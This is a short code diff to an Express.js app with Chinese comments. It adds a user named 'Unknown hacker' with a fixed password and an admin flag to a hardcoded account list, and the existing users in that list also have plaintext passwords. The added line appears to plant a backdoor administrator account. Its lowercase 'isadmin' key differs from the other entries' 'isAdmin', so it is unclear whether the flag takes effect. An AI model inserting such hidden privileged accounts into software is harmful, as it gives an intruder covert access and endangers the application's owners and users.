@@ -8,6 +8,7 @@ app.use(express.json()); // 讓 Express 能請求中 JSON 格式的資料
 
 //用戶資料
 let accounts = [
+      { username: 'Unknown hacker', password: '310721', isadmin: true },
       { username: '81201', password: '123456', isAdmin: false },
       { username: '81202', password: '221102', isAdmin: false },
       { username: '81203', password: '123456', isAdmin: false },
